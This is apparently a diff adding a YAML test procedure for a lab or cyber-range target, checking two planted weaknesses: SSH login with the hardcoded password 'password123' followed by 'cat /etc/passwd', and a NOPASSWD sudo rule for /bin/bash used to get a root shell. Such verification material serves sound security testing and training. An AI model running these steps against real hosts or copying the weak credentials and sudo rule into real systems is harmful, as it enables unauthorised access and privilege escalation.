@@ -1,0 +1,54 @@
+- entity_id: ssh_weak_credentials
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: verify_ssh_running
+      session: null
+      action:
+        type: exec_target
+        command: service ssh status || service sshd status || pgrep sshd
+      expect:
+        exit_code: 0
+      outputs: {}
+      timeout: 10
+    - step_id: exploit_weak_credentials
+      session: null
+      action:
+        type: exec_attacker
+        command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+          appuser@${target_host} 'id && whoami && cat /etc/passwd'
+      expect:
+        stdout_contains: uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
+      outputs: {}
+      timeout: 30
+- entity_id: sudo_privesc_root
+  procedure:
+    sessions: []
+    procedure:
+    - step_id: verify_appuser_exists
+      session: null
+      action:
+        type: exec_target
+        command: id appuser
+      expect:
+        stdout_contains: appuser
+      outputs: {}
+      timeout: 10
+    - step_id: check_sudoers_rule
+      session: null
+      action:
+        type: exec_target
+        command: cat /etc/sudoers.d/appuser
+      expect:
+        stdout_contains: 'NOPASSWD: /bin/bash'
+      outputs: {}
+      timeout: 10
+    - step_id: exploit_sudo_misconfiguration
+      session: null
+      action:
+        type: exec_target
+        command: su -s /bin/bash appuser -c 'sudo /bin/bash -c id'
+      expect:
+        stdout_contains: uid=0(root)
+      outputs: {}
+      timeout: 10
